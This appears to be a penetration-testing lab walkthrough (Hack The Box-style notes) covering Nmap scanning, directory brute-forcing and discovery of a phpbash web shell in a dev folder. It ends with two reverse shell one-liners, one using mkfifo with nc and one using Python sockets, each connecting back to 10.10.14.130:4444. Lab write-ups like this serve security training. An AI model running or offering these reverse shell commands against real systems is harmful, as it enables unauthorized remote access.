### Scanning
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-21 09:23 +0200
Nmap scan report for 10.129.48.108
Host is up (0.028s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds

```

--> Only http port

### Fingerprinting
* Apache 2.4.18
* no X-Powered-By Header

### Directories and Files
* single.html points to this: https://github.com/Arrexel/phpbash
```
.hta.php                [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 20ms]
.hta.html               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 20ms]
.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 20ms]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 20ms]
.htaccess.php           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 20ms]
.hta.js                 [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 20ms]
.htaccess.js            [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 20ms]
.htaccess.html          [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 20ms]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 20ms]
.htpasswd.js            [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 21ms]
.htpasswd.php           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 21ms]
.htpasswd.html          [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 21ms]
about.html              [Status: 200, Size: 8193, Words: 2878, Lines: 155, Duration: 29ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
contact.html            [Status: 200, Size: 7805, Words: 2630, Lines: 157, Duration: 23ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 25ms]
dev                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 20ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 21ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 28ms]
index.html              [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 26ms]
index.html              [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 28ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 20ms]
php                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 26ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 36ms]
single.html             [Status: 200, Size: 7477, Words: 2740, Lines: 155, Duration: 26ms]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 25ms]
:: Progress: [19000/19000] :: Job [1/1] :: 1739 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

--> phpbash.php is in dev directory

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.130 4444 >/tmp/f

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.130",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'